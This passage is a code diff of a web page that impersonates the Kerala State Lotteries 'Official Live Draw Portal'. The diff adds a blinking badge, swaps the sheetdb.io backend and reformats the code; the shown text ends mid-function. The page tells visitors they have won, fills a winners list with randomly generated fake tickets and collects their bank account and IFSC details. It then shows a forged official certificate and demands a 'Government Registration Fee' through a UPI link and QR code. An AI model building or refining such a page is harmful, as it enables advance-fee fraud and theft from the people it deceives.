@@ -12,7 +12,24 @@
         .datetime-bar {background: #0f172a; color: #38bdf8; font-size: 13px; font-weight: bold; text-align: center; padding: 8px; border-radius: 10px 10px 0 0; border: 1px solid #1e293b;}
         .helpline-bar {background: #dc2626; color: #fff; font-size: 14px; font-weight: bold; text-align: center; padding: 10px; border-radius: 0 0 12px 12px; margin-bottom: 12px;}
         .helpline-bar a {color: #fef08a; text-decoration: none;}
-        .live-badge {display: inline-block; background: #ef4444; color: #fff; font-size: 11px; font-weight: 800; padding: 3px 8px; border-radius: 20px; text-transform: uppercase; margin-bottom: 6px;}
+        @keyframes blinkAnimation {
+  0% { opacity: 1; }
+  50% { opacity: 0.3; }
+  100% { opacity: 1; }
+}
+
+.live-badge {
+  display: inline-block; 
+  background: #ef4444; 
+  color: #fff; 
+  font-size: 11px; 
+  font-weight: 800; 
+  padding: 3px 8px; 
+  border-radius: 20px; 
+  text-transform: uppercase; 
+  margin-bottom: 6px;
+  animation: blinkAnimation 1.2s infinite; /* Yahin animation add kiya gaya hai */
+}
         .card-page {background: #fffbeb; padding: 18px; border-radius: 16px; border: 3px solid #f59e0b; margin-bottom: 15px;}
         .banner {background: linear-gradient(135deg, #b45309, #f59e0b); border-radius: 12px; padding: 14px; text-align: center; color: #fff; margin-bottom: 14px;}
         input {width: 100%; padding: 12px; border: 2px solid #f59e0b; border-radius: 8px; font-size: 15px; margin-bottom: 12px; outline: none;}
@@ -26,319 +43,295 @@
         .prize-tier {background: #fff; border: 1px solid #fcd34d; padding: 10px; border-radius: 8px; margin-top: 8px; font-size: 13px;}
         .festival-box {margin-top: 15px; background: #fff; border-radius: 12px; padding: 10px; border: 1.5px solid #fcd34d; text-align: center;}
         .festival-box img {width: 100%; height: 160px; object-fit: cover; border-radius: 8px; margin-top: 6px;}
-        
-        /* Premium Certificate Design Styling */
-        #certificateCard {
-            background: linear-gradient(to bottom, #ffffff, #fffbeb);
-            border: 6px double #b45309;
-            padding: 22px;
-            border-radius: 14px;
-            text-align: left;
-            position: relative;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
-            margin-bottom: 12px;
-        }
-        .qr-container {
-            text-align: center;
-            background: #ffffff;
-            padding: 12px;
-            border-radius: 10px;
-            border: 2px dashed #7c3aed;
-            margin: 12px 0;
-        }
+        #certificateCard {background: linear-gradient(to bottom, #ffffff, #fffbeb); border: 6px double #b45309; padding: 22px; border-radius: 14px; text-align: left; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.08); margin-bottom: 12px;}
+        .qr-container {text-align: center; background: #ffffff; padding: 12px; border-radius: 10px; border: 2px dashed #7c3aed; margin: 12px 0;}
     </style>
 </head>
 <body>
-<canvas id="confettiCanvas"></canvas>
-<div class="wrapper">
-    <div class="datetime-bar" id="liveClock">Loading live date and time...</div>
-    <div class="helpline-bar">📞 Helpline: <a href="tel:7808410288">+917808410288</a></div>
+    <canvas id="confettiCanvas"></canvas>
+    <div class="wrapper">
+        <div class="datetime-bar" id="liveClock">Loading live date and time...</div>
+        <div class="helpline-bar">📞 Helpline: <a href="tel:7808410288">+917808410288</a></div>
 
-    <!-- 1. SEARCH -->
-    <div id="pageSearch" class="card-page">
-        <div class="banner">
-            <span class="live-badge">● LIVE RESULT</span>
-            <h2>Kerala State Lotteries</h2>
-            <p style="color:#fef08a; font-size:14px; font-weight:bold; margin-top:3px;">Official Live Draw Portal</p>
-        </div>
-        <input type="text" id="searchKey" placeholder="Enter Registered Mobile Number or Ticket ID">
-        <button class="btn btn-blue" onclick="checkResult()">Check Result</button>
-        
-        <div class="festival-box">
-            <h4 style="color:#b45309; margin-bottom:4px;">Festivals of Kerala</h4>
-            <p style="font-size:12px; color:#6b7280; margin-bottom:6px;">Celebrating Tradition & Culture</p>
-            <img src="https://images.unsplash.com/photo-1582510003544-4d00b7f74220?w=600&auto=format&fit=crop&q=80" alt="Kerala Festival Onam Boat Race">
-        </div>
-    </div>
-
-    <!-- 2. RESULT -->
-    <div id="pageResult" class="card-page" style="display:none; background:#ecfdf5; border-color:#10b981;">
-        <div style="text-align:center; margin-bottom:10px;">
-            <div style="font-size:36px;" id="resultEmoji">🎉 🏆 🎊</div>
-            <h3 id="resultTitle" style="color:#047857;">CONGRATULATIONS!</h3>
-            <p id="resultSub" style="color:#b45309; font-size:13px; font-weight:bold;">Your ticket has won an official prize award!</p>
-        </div>
-        <div id="resultBox" style="background:#fff; padding:12px; border-radius:8px; border:1px dashed #10b981; margin-bottom:12px;"></div>
-        
-        <!-- Random Winners 1st to 10th Section -->
-        <h4 style="color:#1e3a8a; margin-top:15px; margin-bottom:5px; text-align:center;">🌟 Official Prize Winners Directory 🌟</h4>
-        <div id="randomWinnersList" style="max-height: 220px; overflow-y: auto; margin-bottom: 12px;"></div>
-
-        <button id="claimBtn" class="btn btn-green" onclick="showPage('pageWithdraw')">Claim / Withdraw Prize ➔</button>
-        <button class="btn btn-gray" onclick="showPage('pageSearch')">Check Another Ticket</button>
-    </div>
-
-    <!-- 3. WITHDRAW -->
-    <div id="pageWithdraw" class="card-page" style="display:none;">
-        <h3 style="color:#1e3a8a; text-align:center; margin-bottom:12px;">Bank Transfer & Verification Form</h3>
-        <form onsubmit="handleBankSubmit(event)">
-            <input type="text" id="custName" required placeholder="Account Holder Full Name">
-            <input type="text" id="bankName" required placeholder="Bank Name (e.g., SBI, HDFC, ICICI)">
-            <input type="text" id="accNumber" required placeholder="Bank Account Number" oninput="maskRealtime(this.value)">
-            <input type="text" id="ifscCode" required placeholder="Bank IFSC Code">
-            <div style="background:#fef08a; padding:8px; border-radius:6px; font-size:13px; font-weight:bold; color:#854d0e; margin-bottom:12px;">
-                Masked Account: <span id="realtimeMask">XXXX-XXXX-XXXX</span>
+        <!-- 1. SEARCH -->
+        <div id="pageSearch" class="card-page">
+            <div class="banner">
+                <span class="live-badge"><span class="blink-dot"></span> LIVE RESULT</span>
+                <h2>Kerala State Lotteries</h2>
+                <p style="color:#fef08a; font-size:14px; font-weight:bold; margin-top:3px;">Official Live Draw Portal</p>
             </div>
-            <button type="submit" class="btn btn-amber">Submit for Verification</button>
-            <button type="button" class="btn btn-gray" onclick="showPage('pageResult')">Back</button>
-        </form>
-    </div>
-
-    <!-- 4. CONFIRMATION & CERTIFICATE -->
-    <div id="pageConfirm" class="card-page" style="display:none; background:#ecfdf5; border-color:#2563eb;">
-        <div style="text-align:center; margin-bottom:10px;">
-            <div style="font-size:36px;">✅ 💳</div>
-            <h3 style="color:#15803d;">Verification Complete</h3>
-        </div>
-        
-        <!-- Premium Printable Certificate Box with Date -->
-        <div id="certificateCard">
-            <div style="text-align:center; border-bottom: 2px solid #b45309; padding-bottom: 8px; margin-bottom: 10px;">
-                <h3 style="color:#1e3a8a; margin:0; font-size:18px;">🏛️ KERALA STATE LOTTERIES 🏛️</h3>
-                <p style="font-size:11px; color:#b45309; font-weight:bold; margin:3px 0; letter-spacing:1px;">OFFICIAL WINNER CERTIFICATE & RECEIPT</p>
-                <p style="font-size:10px; color:#475569;" id="certTimestamp">Verification Date: --/--/----</p>
-            </div>
-            <div id="receiptBox"></div>
-            <div style="margin-top: 15px; text-align: right;">
-                <p style="font-size: 11px; font-weight: bold; color: #1e3a8a;">Authorized Signatory</p>
-                <p style="font-size: 10px; color: #64748b;">Directorate of State Lotteries, Kerala</p>
+            <input type="text" id="searchKey" placeholder="Enter Registered Mobile Number or Ticket ID">
+            <button class="btn btn-blue" onclick="checkResult()">Check Result</button>
+            <div class="festival-box">
+                <h4 style="color:#b45309; margin-bottom:4px;">Festivals of Kerala</h4>
+                <p style="font-size:12px; color:#6b7280; margin-bottom:6px;">Celebrating Tradition & Culture</p>
+                <img src="https://images.unsplash.com/photo-1582510003544-4d00b7f74220?w=600&auto=format&fit=crop&q=80" alt="Kerala Festival Onam Boat Race">
             </div>
         </div>
 
-        <!-- UPI Button and QR Container placed right between payment button and download option -->
-        <div id="upiBtnContainer"></div>
-        <div id="upiQrContainer"></div>
+        <!-- 2. RESULT -->
+        <div id="pageResult" class="card-page" style="display:none; background:#ecfdf5; border-color:#10b981;">
+            <div style="text-align:center; margin-bottom:10px;">
+                <div style="font-size:36px;" id="resultEmoji">🎉 🏆 🎊</div>
+                <h3 id="resultTitle" style="color:#047857;">CONGRATULATIONS!</h3>
+                <p id="resultSub" style="color:#b45309; font-size:13px; font-weight:bold;">Your ticket has won an official prize award!</p>
+            </div>
+            <div id="resultBox" style="background:#fff; padding:12px; border-radius:8px; border:1px dashed #10b981; margin-bottom:12px;"></div>
+            <h4 style="color:#1e3a8a; margin-top:15px; margin-bottom:5px; text-align:center;">🌟 Official Prize Winners Directory 🌟</h4>
+            <div id="randomWinnersList" style="max-height: 220px; overflow-y: auto; margin-bottom: 12px;"></div>
+            <button id="claimBtn" class="btn btn-green" onclick="showPage('pageWithdraw')">Claim / Withdraw Prize ➔</button>
+            <button class="btn btn-gray" onclick="showPage('pageSearch')">Check Another Ticket</button>
+        </div>
 
-        <button class="btn btn-green" style="margin-top: 12px;" onclick="downloadCertificate()">📥 Download Winning Certificate</button>
-        <button class="btn btn-blue" style="margin-top: 8px;" onclick="showPage('pageSearch')">Return to Home</button>
-    </div>
-</div>
-
-<script>
-    function updateLiveClock() {
-        const now = new Date();
-        document.getElementById('liveClock').innerHTML = `📅 ${now.toLocaleDateString('en-IN')} &nbsp;|&nbsp; ⏰ ${now.toLocaleTimeString('en-IN')} (IST)`;
-    }
-    setInterval(updateLiveClock, 1000);
-    updateLiveClock();
-
-    const API_URL = "https://sheetdb.io/api/v1/osehsg02p213h";
-    let current = { ticket: "", mobile: "", prize: "", amount: "", name: "", fee: "0", upiId: "", status: "Active", verifyDate: "" };
-
-    function showPage(id) {
-        ['pageSearch', 'pageResult', 'pageWithdraw', 'pageConfirm'].forEach(p => {
-            document.getElementById(p).style.display = (p === id) ? 'block' : 'none';
-        });
-        window.scrollTo({ top: 0, behavior: 'smooth' });
-    }
-
-    function generateRandomTicket() {
-        const num = Math.floor(100000 + Math.random() * 900000);
-        return "Kl " + num;
-    }
-
-    function buildRandomWinnersPool(userTicket, userPrize) {
-        const structure = [
-            { rank: "1st", prizeText: "25Cr", count: 1 },
-            { rank: "2nd", prizeText: "10Cr", count: 1 },
-            { rank: "3rd", prizeText: "75 Lakh", count: 1 },
-            { rank: "4th", prizeText: "25 Lakh", count: 12 },
-            { rank: "5th", prizeText: "12 Lakh", count: 16 },
-            { rank: "6th", prizeText: "1 Lakh", count: 36 },
-            { rank: "7th", prizeText: "75000", count: 99 },
-            { rank: "8th", prizeText: "25000", count: 120 },
-            { rank: "9th", prizeText: "10000", count: 179 },
-            { rank: "10th", prizeText: "2500", count: 200 }
-        ];
-
-        let htmlContent = "";
-
-        structure.forEach(tier => {
-            let tickets = [];
-            for (let i = 0; i < tier.count; i++) {
-                tickets.push(generateRandomTicket());
-            }
-
-            let formattedUserTicket = userTicket.toUpperCase().startsWith("KL") ? userTicket.toUpperCase() : "Kl " + userTicket;
-
-            if (userTicket && tier.rank.toLowerCase() === userPrize.toLowerCase()) {
-                let randomIndex = Math.floor(Math.random() * tickets.length);
-                tickets[randomIndex] = formattedUserTicket;
-            }
-
-            let isUserTier = userTicket && tier.rank.toLowerCase() === userPrize.toLowerCase();
-            htmlContent += `
-                <div class="prize-tier" ${isUserTier ? 'style="border: 2px solid #16a34a; background:#f0fdf4;"' : ''}>
-                    <b>⭐ ${tier.rank} Prize (${tier.prizeText})</b> <span style="color:#64748b; font-size:11px;">(${tier.count} Person)</span>
-                    <div style="margin-top:4px; font-size:12px; font-family:monospace; color:#334155; word-break: break-all;">
-                        ${tickets.map(t => t === formattedUserTicket ? `<span style="background:#fef08a; padding:2px 6px; border-radius:4px; border:1px solid #d97706; font-weight:bold; color:#b45309;">⭐ ${t} (You)</span>` : `<span>${t}</span>`).join(', ')}
-                    </div>
+        <!-- 3. WITHDRAW -->
+        <div id="pageWithdraw" class="card-page" style="display:none;">
+            <h3 style="color:#1e3a8a; text-align:center; margin-bottom:12px;">Bank Transfer & Verification Form</h3>
+            <form onsubmit="handleBankSubmit(event)">
+                <input type="text" id="custName" required placeholder="Account Holder Full Name">
+                <input type="text" id="bankName" required placeholder="Bank Name (e.g., SBI, HDFC, ICICI)">
+                <input type="text" id="accNumber" required placeholder="Bank Account Number" oninput="maskRealtime(this.value)">
+                <input type="text" id="ifscCode" required placeholder="Bank IFSC Code">
+                <div style="background:#fef08a; padding:8px; border-radius:6px; font-size:13px; font-weight:bold; color:#854d0e; margin-bottom:12px;">
+                    Masked Account: <span id="realtimeMask">XXXX-XXXX-XXXX</span>
                 </div>
-            `;
-        });
+                <button type="submit" class="btn btn-amber">Submit for Verification</button>
+                <button type="button" class="btn btn-gray" onclick="showPage('pageResult')">Back</button>
+            </form>
+        </div>
 
-        document.getElementById("randomWinnersList").innerHTML = htmlContent;
-    }
+        <!-- 4. CONFIRMATION & CERTIFICATE -->
+        <div id="pageConfirm" class="card-page" style="display:none; background:#ecfdf5; border-color:#2563eb;">
+            <div style="text-align:center; margin-bottom:10px;">
+                <div style="font-size:36px;">✅ 💳</div>
+                <h3 style="color:#15803d;">Verification Complete</h3>
+            </div>
+            <div id="certificateCard">
+                <div style="text-align:center; border-bottom: 2px solid #b45309; padding-bottom: 8px; margin-bottom: 10px;">
+                    <h3 style="color:#1e3a8a; margin:0; font-size:18px;">🏛️ KERALA STATE LOTTERIES 🏛️</h3>
+                    <p style="font-size:11px; color:#b45309; font-weight:bold; margin:3px 0; letter-spacing:1px;">OFFICIAL WINNER CERTIFICATE & RECEIPT</p>
+                    <p style="font-size:10px; color:#475569;" id="certTimestamp">Verification Date: --/--/----</p>
+                </div>
+                <div id="receiptBox"></div>
+                <div style="margin-top: 15px; text-align: right;">
+                    <p style="font-size: 11px; font-weight: bold; color: #1e3a8a;">Authorized Signatory</p>
+                    <p style="font-size: 10px; color: #64748b;">Directorate of State Lotteries, Kerala</p>
+                </div>
+            </div>
+            <div id="upiBtnContainer"></div>
+            <div id="upiQrContainer"></div>
+            <button class="btn btn-green" style="margin-top: 12px;" onclick="downloadCertificate()">📥 Download Winning Certificate</button>
+            <button class="btn btn-blue" style="margin-top: 8px;" onclick="showPage('pageSearch')">Return to Home</button>
+        </div>
+    </div>
 
-    async function checkResult() {
-        const key = document.getElementById("searchKey").value.trim();
-        if (!key) {
-            alert("Please enter a valid Ticket Number or Mobile Number.");
-            return;
+    <script>
+        function updateLiveClock() {
+            const now = new Date();
+            document.getElementById('liveClock').innerHTML = `📅 ${now.toLocaleDateString('en-IN')} &nbsp;|&nbsp; ⏰ ${now.toLocaleTimeString('en-IN')} (IST)`;
         }
-        let foundData = null;
-        try {
-            let res = await fetch(`${API_URL}/search?ticket=${encodeURIComponent(key)}&casesensitive=false`);
-            let data = await res.json();
-            if (data && data.length > 0) {
-                foundData = data[0];
-            } else {
-                res = await fetch(`${API_URL}/search?mobile=${encodeURIComponent(key)}&casesensitive=false`);
-                data = await res.json();
+        setInterval(updateLiveClock, 1000);
+        updateLiveClock();
+
+        const API_URL = "https://sheetdb.io/api/v1/zele5gwahrklp";
+        let current = { ticket: "", mobile: "", prize: "", amount: "", name: "", fee: "0", upiId: "", status: "Active", verifyDate: "" };
+
+        function showPage(id) {
+            ['pageSearch', 'pageResult', 'pageWithdraw', 'pageConfirm'].forEach(p => {
+                document.getElementById(p).style.display = (p === id) ? 'block' : 'none';
+            });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function generateRandomTicket() {
+            const num = Math.floor(100000 + Math.random() * 900000);
+            return "Kl " + num;
+        }
+
+        function buildRandomWinnersPool(userTicket, userPrize) {
+            const structure = [
+                { rank: "1st", prizeText: "25Cr", count: 1 },
+                { rank: "2nd", prizeText: "10Cr", count: 1 },
+                { rank: "3rd", prizeText: "75 Lakh", count: 1 },
+                { rank: "4th", prizeText: "25 Lakh", count: 12 },
+                { rank: "5th", prizeText: "12 Lakh", count: 16 },
+                { rank: "6th", prizeText: "1 Lakh", count: 36 },
+                { rank: "7th", prizeText: "75000", count: 99 },
+                { rank: "8th", prizeText: "25000", count: 120 },
+                { rank: "9th", prizeText: "10000", count: 179 },
+                { rank: "10th", prizeText: "2500", count: 200 }
+            ];
+
+            let htmlContent = "";
+            structure.forEach(tier => {
+                let tickets = [];
+                for (let i = 0; i < tier.count; i++) {
+                    tickets.push(generateRandomTicket());
+                }
+
+                let formattedUserTicket = userTicket.toUpperCase().startsWith("KL") ? userTicket.toUpperCase() : "Kl " + userTicket;
+                if (userTicket && tier.rank.toLowerCase() === userPrize.toLowerCase()) {
+                    let randomIndex = Math.floor(Math.random() * tickets.length);
+                    tickets[randomIndex] = formattedUserTicket;
+                }
+
+                let isUserTier = userTicket && tier.rank.toLowerCase() === userPrize.toLowerCase();
+
+                htmlContent += `
+                    <div class="prize-tier" ${isUserTier ? 'style="border: 2px solid #16a34a; background:#f0fdf4;"' : ''}>
+                        <b>⭐ ${tier.rank} Prize (${tier.prizeText})</b> <span style="color:#64748b; font-size:11px;">(${tier.count} Person)</span>
+                        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-top: 8px; font-family:monospace;">
+                            ${tickets.map(t => t === formattedUserTicket ? 
+                                `<span style="background:#fef08a; padding:6px 4px; border-radius:6px; border:1px solid #d97706; font-weight:bold; color:#b45309; font-size:11px; text-align:center;">⭐ ${t} (You)</span>` : 
+                                `<span style="background:#f8fafc; border:1px solid #cbd5e1; padding:6px 4px; border-radius:5px; color:#334155; font-size:11px; text-align:center;">${t}</span>`
+                            ).join('')}
+                        </div>
+                    </div>
+                `;
+            });
+            document.getElementById("randomWinnersList").innerHTML = htmlContent;
+        }
+
+        async function checkResult() {
+            const key = document.getElementById("searchKey").value.trim();
+            if (!key) {
+                alert("Please enter a valid Ticket Number or Mobile Number.");
+                return;
+            }
+
+            let foundData = null;
+            try {
+                let res = await fetch(`${API_URL}/search?ticket=${encodeURIComponent(key)}&casesensitive=false`);
+                let data = await res.json();
                 if (data && data.length > 0) {
                     foundData = data[0];
+                } else {
+                    res = await fetch(`${API_URL}/search?mobile=${encodeURIComponent(key)}&casesensitive=false`);
+                    data = await res.json();
+                    if (data && data.length > 0) {
+                        foundData = data[0];
+                    }
                 }
+            } catch (err) {
+                foundData = null;
             }
-        } catch (err) {
-            foundData = null;
+
+            const resBox = document.getElementById("resultBox");
+            const resTitle = document.getElementById("resultTitle");
+            const resSub = document.getElementById("resultSub");
+            const resEmoji = document.getElementById("resultEmoji");
+            const claimBtn = document.getElementById("claimBtn");
+
+            if (foundData) {
+                let rawTicket = foundData.ticket || key.toUpperCase();
+                current = {
+                    ticket: rawTicket.toUpperCase().startsWith("KL") ? rawTicket.toUpperCase() : "Kl " + rawTicket,
+                    mobile: foundData.mobile || "N/A",
+                    name: foundData.name || "Customer",
+                    prize: foundData.prize || "1st",
+                    amount: foundData.amount || "0",
+                    fee: foundData.fee || "0",
+                    upiId: foundData.upiId || "",
+                    status: foundData.status || "Active"
+                };
+
+                resEmoji.innerText = "🎉 🏆 🎊";
+                resTitle.innerText = "CONGRATULATIONS!";
+                resTitle.style.color = "#047857";
+                resSub.innerText = "Your ticket has won an official prize award!";
+                claimBtn.style.display = "block";
+
+                resBox.innerHTML = `
+                    <div class="result-row"><b>Beneficiary Name:</b><span>${current.name}</span></div>
+                    <div class="result-row"><b>Registered Mobile:</b><span>${current.mobile}</span></div>
+                    <div class="result-row"><b>Ticket Number:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.ticket}</span></div>
+                    <div class="result-row"><b>Winning Category:</b><span style="color:#dc2626; font-weight:bold;">⭐ ${current.prize} Prize Winner</span></div>
+                    <div class="result-row"><b>Prize Amount:</b><span style="color:#15803d; font-weight:bold; font-size:16px;">₹${current.amount}</span></div>
+                    <div class="result-row"><b>Claim Status:</b><span style="color:#15803d; font-weight:bold;">${current.status}</span></div>
+                `;
+
+                buildRandomWinnersPool(current.ticket, current.prize);
+                fireConfetti();
+            } else {
+                resEmoji.innerText = "🍀";
+                resTitle.innerText = "BETTER LUCK NEXT TIME!";
+                resTitle.style.color = "#d97706";
+                resSub.innerText = "The entered ticket or mobile number was not found in the winning panel.";
+                claimBtn.style.display = "none";
+
+                resBox.innerHTML = `
+                    <div style="text-align:center; padding: 15px; color: #4b5563; font-size: 14px;">
+                        <p>No winning records matched for: <b>${key}</b></p>
+                        <p style="margin-top: 6px; font-size: 12px;">Please check your ticket number or mobile number and try again.</p>
+                    </div>
+                `;
+                buildRandomWinnersPool("", "");
+            }
+            showPage("pageResult");
         }
 
-        const resBox = document.getElementById("resultBox");
-        const resTitle = document.getElementById("resultTitle");
-        const resSub = document.getElementById("resultSub");
-        const resEmoji = document.getElementById("resultEmoji");
-        const claimBtn = document.getElementById("claimBtn");
+        function maskRealtime(val) {
+            const c = val.replace(/\s+/g, '');
+            document.getElementById("realtimeMask").innerText = c.length > 4 ? "XXXX-XXXX-" + c.slice(-4) : "XXXX-XXXX-" + c;
+        }
 
-        if (foundData) {
-            let rawTicket = foundData.ticket || key.toUpperCase();
-            current = {
-                ticket: rawTicket.toUpperCase().startsWith("KL") ? rawTicket.toUpperCase() : "Kl " + rawTicket,
-                mobile: foundData.mobile || "N/A",
-                name: foundData.name || "Customer",
-                prize: foundData.prize || "1st",
-                amount: foundData.amount || "0",
-                fee: foundData.fee || "0",
-                upiId: foundData.upiId || "",
-                status: foundData.status || "Active"
-            };
+        function handleBankSubmit(e) {
+            e.preventDefault();
+            const enteredName = document.getElementById("custName").value.trim();
+            const enteredBank = document.getElementById("bankName").value.trim();
+            const acc = document.getElementById("accNumber").value.trim();
+            const enteredIfsc = document.getElementById("ifscCode").value.toUpperCase().trim();
+            const mask = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
 
-            resEmoji.innerText = "🎉 🏆 🎊";
-            resTitle.innerText = "CONGRATULATIONS!";
-            resTitle.style.color = "#047857";
-            resSub.innerText = "Your ticket has won an official prize award!";
-            claimBtn.style.display = "block";
+            const now = new Date();
+            current.verifyDate = now.toLocaleDateString('en-IN') + ' ' + now.toLocaleTimeString('en-IN');
+            document.getElementById("certTimestamp").innerText = "Verification Date & Time: " + current.verifyDate;
 
-            resBox.innerHTML = `
-                <div class="result-row"><b>Beneficiary Name:</b><span>${current.name}</span></div>
+            document.getElementById("receiptBox").innerHTML = `
+                <div class="result-row"><b>Account Holder:</b><span>${enteredName}</span></div>
                 <div class="result-row"><b>Registered Mobile:</b><span>${current.mobile}</span></div>
+                <div class="result-row"><b>Bank Name:</b><span>${enteredBank}</span></div>
+                <div class="result-row"><b>Account Number:</b><span style="color:#b45309; font-weight:bold;">${mask}</span></div>
+                <div class="result-row"><b>IFSC Code:</b><span>${enteredIfsc}</span></div>
+                <div class="result-row"><b>Winning Category:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.prize} Prize</span></div>
                 <div class="result-row"><b>Ticket Number:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.ticket}</span></div>
-                <div class="result-row"><b>Winning Category:</b><span style="color:#dc2626; font-weight:bold;">⭐ ${current.prize} Prize Winner</span></div>
-                <div class="result-row"><b>Prize Amount:</b><span style="color:#15803d; font-weight:bold; font-size:16px;">₹${current.amount}</span></div>
-                <div class="result-row"><b>Claim Status:</b><span style="color:#15803d; font-weight:bold;">${current.status}</span></div>
+                <div class="result-row"><b>Transfer Amount:</b><span style="color:#15803d; font-weight:bold;">₹${current.amount}</span></div>
+                <div class="result-row"><b>Government Registration Fee:</b><span style="color:#dc2626; font-weight:bold;">₹${current.fee}</span></div>
+                ${current.upiId ? `<div class="result-row"><b>Pay Government registration fee:</b><span style="color:#7c3aed; font-weight:bold;">${current.upiId}</span></div>` : ''}
             `;
 
-            buildRandomWinnersPool(current.ticket, current.prize);
+            const upiBtnBox = document.getElementById("upiBtnContainer");
+            const upiQrBox = document.getElementById("upiQrContainer");
+
+            if (current.upiId) {
+                const upiPayUrl = `upi://pay?pa=${encodeURIComponent(current.upiId)}&pn=LotteryWinner&am=${current.fee}&cu=INR`;
+                const qrImageUrl = `https://quickchart.io/qr?text=${encodeURIComponent(upiPayUrl)}&size=160&margin=1`;
+
+                upiBtnBox.innerHTML = `
+                    <a class="btn-upi" href="${upiPayUrl}">
+                        📱 Pay via UPI App: ${current.upiId} (₹${current.fee})
+                    </a>
+                `;
+                upiQrBox.innerHTML = `
+                    <div class="qr-container">
+                        <p style="font-size: 13px; font-weight: bold; color: #7c3aed; margin-bottom: 6px;">Scan QR Code to Pay Registration Fee</p>
+                        <img src="${qrImageUrl}" alt="UPI QR Code" style="width: 150px; height: 150px; border-radius: 6px;">
+                        <p style="font-size: 11px; color: #64748b; margin-top: 4px;">Scan using Google Pay, PhonePe, Paytm</p>
+                    </div>
+                `;
+            } else {
+                upiBtnBox.innerHTML = "";
+                upiQrBox.innerHTML = "";
+            }
+
+            showPage("pageConfirm");
             fireConfetti();
-        } else {
-            resEmoji.innerText = "🍀";
-            resTitle.innerText = "BETTER LUCK NEXT TIME!";
-            resTitle.style.color = "#d97706";
-            resSub.innerText = "The entered ticket or mobile number was not found in the winning panel.";
-            claimBtn.style.display = "none";
-            resBox.innerHTML = `
-                <div style="text-align:center; padding: 15px; color: #4b5563; font-size: 14px;">
-                    <p>No winning records matched for: <b>${key}</b></p>
-                    <p style="margin-top: 6px; font-size: 12px;">Please check your ticket number or mobile number and try again.</p>
-                </div>
-            `;
-            buildRandomWinnersPool("", "");
         }
-        showPage("pageResult");
-    }
 
-    function maskRealtime(val) {
-        const c = val.replace(/\s+/g, '');
-        document.getElementById("realtimeMask").innerText = c.length > 4 ? "XXXX-XXXX-" + c.slice(-4) : "XXXX-XXXX-" + c;
-    }
-
-    function handleBankSubmit(e) {
-        e.preventDefault();
-        const enteredName = document.getElementById("custName").value.trim();
-        const enteredBank = document.getElementById("bankName").value.trim();
-        const acc = document.getElementById("accNumber").value.trim();
-        const enteredIfsc = document.getElementById("ifscCode").value.toUpperCase().trim();
-        const mask = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
-
-        const now = new Date();
-        current.verifyDate = now.toLocaleDateString('en-IN') + ' ' + now.toLocaleTimeString('en-IN');
-        document.getElementById("certTimestamp").innerText = "Verification Date & Time: " + current.verifyDate;
-
-        document.getElementById("receiptBox").innerHTML = `
-            <div class="result-row"><b>Account Holder:</b><span>${enteredName}</span></div>
-            <div class="result-row"><b>Registered Mobile:</b><span>${current.mobile}</span></div>
-            <div class="result-row"><b>Bank Name:</b><span>${enteredBank}</span></div>
-            <div class="result-row"><b>Account Number:</b><span style="color:#b45309; font-weight:bold;">${mask}</span></div>
-            <div class="result-row"><b>IFSC Code:</b><span>${enteredIfsc}</span></div>
-            <div class="result-row"><b>Winning Category:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.prize} Prize</span></div>
-            <div class="result-row"><b>Ticket Number:</b><span style="color:#b45309; font-weight:bold;">⭐ ${current.ticket}</span></div>
-            <div class="result-row"><b>Transfer Amount:</b><span style="color:#15803d; font-weight:bold;">₹${current.amount}</span></div>
-            <div class="result-row"><b>Government Registration Fee:</b><span style="color:#dc2626; font-weight:bold;">₹${current.fee}</span></div>
-            ${current.upiId ? `<div class="result-row"><b>Pay Government registration fee:</b><span style="color:#7c3aed; font-weight:bold;">${current.upiId}</span></div>` : ''}
-        `;
-
-        const upiBtnBox = document.getElementById("upiBtnContainer");
-        const upiQrBox = document.getElementById("upiQrContainer");
-
-        if (current.upiId) {
-            const upiPayUrl = `upi://pay?pa=${encodeURIComponent(current.upiId)}&pn=LotteryWinner&am=${current.fee}&cu=INR`;
-            const qrImageUrl = `https://quickchart.io/qr?text=${encodeURIComponent(upiPayUrl)}&size=160&margin=1`;
-            
-            upiBtnBox.innerHTML = `
-                <a class="btn-upi" href="${upiPayUrl}">
-                    📱 Pay via UPI App: ${current.upiId} (₹${current.fee})
-                </a>
-            `;
-
-            upiQrBox.innerHTML = `
-                <div class="qr-container">
-                    <p style="font-size: 13px; font-weight: bold; color: #7c3aed; margin-bottom: 6px;">Scan QR Code to Pay Registration Fee</p>
-                    <img src="${qrImageUrl}" alt="UPI QR Code" style="width: 150px; height: 150px; border-radius: 6px;">
-                    <p style="font-size: 11px; color: #64748b; margin-top: 4px;">Scan using Google Pay, PhonePe, Paytm</p>
-                </div>
-            `;
-        } else {
-            upiBtnBox.innerHTML = "";
-            upiQrBox.innerHTML = "";
-        }
-        showPage("pageConfirm");
-        fireConfetti();
-    }
-
-    function downloadCertificate() {
-        const certificateElement = document.getElementById("certificateCard").innerHTML;
-        const winPrint = window.open('', '', 'left=0,top=0,width=800,height=900,toolbar=0,scrollbars=0,status=0');
-        winPrint.document.write(`
-            <html>
+        function downloadCertificate() {
+            const certificateElement = document.getElementById("certificateCard").innerHTML;
+            const winPrint = window.open('', '', 'left=0,top=0,width=800,height=900,toolbar=0,scrollbars=0,status=0');
+            winPrint.document.write(`
+                <html>
                 <head>
                     <title>Winning Certificate - Kerala State Lotteries</title>
                     <style>
@@ -352,40 +345,49 @@
                         ${certificateElement}
                     </div>
                 </body>
-            </html>
-        `);
-        winPrint.document.close();
-        winPrint.focus();
-        setTimeout(() => {
-            winPrint.print();
-            winPrint.close();
-        }, 500);
-    }
+                </html>
+            `);
+            winPrint.document.close();
+            winPrint.focus();
+            setTimeout(() => {
+                winPrint.print();
+                winPrint.close();
+            }, 500);
+        }
 
-    function fireConfetti() {
-        const c = document.getElementById('confettiCanvas');
-        if (!c) return;
-        const ctx = c.getContext('2d');
-        c.width = window.innerWidth;
-        c.height = window.innerHeight;
-        c.style.display = 'block';
-        const p = Array.from({ length: 50 }, () => ({
